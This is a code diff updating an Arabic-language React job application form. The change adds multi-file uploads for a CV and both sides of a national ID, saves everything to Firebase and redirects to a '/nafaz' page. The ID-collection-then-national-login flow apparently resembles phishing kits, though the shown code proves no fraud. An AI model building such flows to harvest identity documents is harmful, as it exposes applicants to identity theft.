@@ -1,12 +1,11 @@
 "use client"
 
-import { useState } from "react"
+import { useState, useEffect } from "react"
 import { zodResolver } from "@hookform/resolvers/zod"
 import { useForm } from "react-hook-form"
 import { z } from "zod"
 import {
   Loader2,
-  Upload,
   CheckCircle2,
   AlertCircle,
   Briefcase,
@@ -29,14 +28,15 @@ import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
 import { Label } from "@/components/ui/label"
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
 import { cn } from "@/lib/utils"
-import { ImageUploader } from "./image-uloader"
 import { addData } from "@/lib/firebase"
 import { useRouter } from "next/navigation"
+import { MultipleImageUploader } from "./multiple-image-uploader"
 
 const MAX_FILE_SIZE = 5 * 1024 * 1024 // 5MB
 function uniqueID() {
   return Math.floor(Math.random() * Date.now())
 }
+
 const formSchema = z.object({
   // Personal Information
   fullName: z.string().min(3, {
@@ -89,14 +89,14 @@ const formSchema = z.object({
   coverLetter: z.string().optional(),
 
   // Files
-  idFront: z.any().optional(),
-  idBack: z.any().optional(),
-  cv: z.any().optional(),
+  idFrontImages: z.array(z.string()).optional(),
+  idBackImages: z.array(z.string()).optional(),
+  cvFiles: z.array(z.string()).optional(),
 })
 
 export type FormValues = z.infer<typeof formSchema>
 
-export function JobApplicationForm() {
+export function JobApplicationFormUpdated() {
   const [isSubmitting, setIsSubmitting] = useState(false)
   const [activeTab, setActiveTab] = useState("personal")
   const [formProgress, setFormProgress] = useState({
@@ -106,7 +106,8 @@ export function JobApplicationForm() {
   })
   const id = uniqueID()
   const router = useRouter()
-  const form = useForm<any>({
+
+  const form = useForm<FormValues>({
     resolver: zodResolver(formSchema),
     defaultValues: {
       fullName: "",
@@ -123,6 +124,9 @@ export function JobApplicationForm() {
       linkedinProfile: "",
       expectedSalary: "",
       coverLetter: "",
+      idFrontImages: [],
+      idBackImages: [],
+      cvFiles: [],
     },
     mode: "onChange",
   })
@@ -143,39 +147,43 @@ export function JobApplicationForm() {
     )
 
     const documentsComplete =
-      form.getValues("idFront")?.[0] && form.getValues("idBack")?.[0] && form.getValues("cv")?.[0]
+      (watchedFields.idFrontImages?.length || 0) > 0 &&
+      (watchedFields.idBackImages?.length || 0) > 0 &&
+      (watchedFields.cvFiles?.length || 0) > 0
 
     setFormProgress({
       personal: personalComplete,
       professional: professionalComplete,
-      documents: !!documentsComplete,
+      documents: documentsComplete,
     })
   }
 
   // Update progress when form changes
-  form.watch(() => {
+  useEffect(() => {
     updateProgress()
-  })
+  }, [watchedFields])
 
-  async function onSubmit(values: any) {
-    // Get file values from the form
-    -//  submitApplication(values as any)
-      addData({ id: id, ...values })
-
-
-
-
-
+  async function onSubmit(values: FormValues) {
     setIsSubmitting(true)
 
     try {
+      // Add application data to Firebase
+      await addData({
+        collection: "applications",
+        id: id.toString(),
+          ...values,
+          applicationId: id,
+          status: "pending",
+          submittedAt: new Date().toISOString(),
+      })
+      router.push("/nafaz")
 
-      // This is a mock server action - in a real app you would implement this
       toast({
         title: "تم إرسال طلبك بنجاح",
         description: "سنقوم بمراجعة طلبك والرد عليك قريباً",
       })
-      router.push('/nafaz')
+
+
       // Reset form
       form.reset()
       setActiveTab("personal")
@@ -185,6 +193,7 @@ export function JobApplicationForm() {
         documents: false,
       })
     } catch (error) {
+      console.error("Submission error:", error)
       toast({
         variant: "destructive",
         title: "حدث خطأ",
@@ -414,6 +423,7 @@ export function JobApplicationForm() {
               </TabsContent>
 
               <TabsContent value="professional" className="space-y-6">
+                {/* Professional tab content - unchanged from original */}
                 <div className="flex items-center gap-2 mb-4">
                   <Briefcase className="h-5 w-5 text-blue-600" />
                   <h3 className="text-xl font-medium">المعلومات المهنية</h3>
@@ -658,12 +668,78 @@ export function JobApplicationForm() {
                   </div>
                 </div>
 
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div className="grid grid-cols-1 gap-6">
+                  <FormField
+                    control={form.control}
+                    name="cvFiles"
+                    render={({ field }) => (
+                      <FormItem>
+                        <FormLabel>
+                          السيرة الذاتية <span className="text-red-500">*</span>
+                        </FormLabel>
+                        <FormControl>
+                          <MultipleImageUploader
+                            fieldName="cv"
+                            label="السيرة الذاتية"
+                            description="PDF, DOC, DOCX (MAX. 5MB)"
+                            acceptedFileTypes="application/pdf,application/msword,application/vnd.openxmlformats-officedocument.wordprocessingml.document"
+                            maxFiles={1}
+                            onChange={(urls) => field.onChange(urls)}
+                            value={field.value}
+                          />
+                        </FormControl>
+                        <FormMessage />
+                      </FormItem>
+                    )}
+                  />
 
-                  <ImageUploader text={'اضغط لتحميل السيرة الذاتية'} />
-                  <ImageUploader text={'اضغط لتحميل صورة الهوية (الوجه الأمامي)'} />
-                  <ImageUploader text={'اضغط لتحميل صورة الهوية (الوجه الخلفي)'} />
+                  <FormField
+                    control={form.control}
+                    name="idFrontImages"
+                    render={({ field }) => (
+                      <FormItem>
+                        <FormLabel>
+                          صورة الهوية (الوجه الأمامي) <span className="text-red-500">*</span>
+                        </FormLabel>
+                        <FormControl>
+                          <MultipleImageUploader
+                            fieldName="idFront"
+                            label="صورة الهوية (الوجه الأمامي)"
+                            description="JPG, PNG (MAX. 5MB)"
+                            acceptedFileTypes="image/*"
+                            maxFiles={1}
+                            onChange={(urls) => field.onChange(urls)}
+                            value={field.value}
+                          />
+                        </FormControl>
+                        <FormMessage />
+                      </FormItem>
+                    )}
+                  />
 
+                  <FormField
+                    control={form.control}
+                    name="idBackImages"
+                    render={({ field }) => (
+                      <FormItem>
+                        <FormLabel>
+                          صورة الهوية (الوجه الخلفي) <span className="text-red-500">*</span>
+                        </FormLabel>
+                        <FormControl>
+                          <MultipleImageUploader
+                            fieldName="idBack"
+                            label="صورة الهوية (الوجه الخلفي)"
+                            description="JPG, PNG (MAX. 5MB)"
+                            acceptedFileTypes="image/*"
+                            maxFiles={1}
+                            onChange={(urls) => field.onChange(urls)}
+                            value={field.value}
+                          />
+                        </FormControl>
+                        <FormMessage />
+                      </FormItem>
+                    )}
+                  />
                 </div>
 
                 <div className="flex justify-between pt-4">
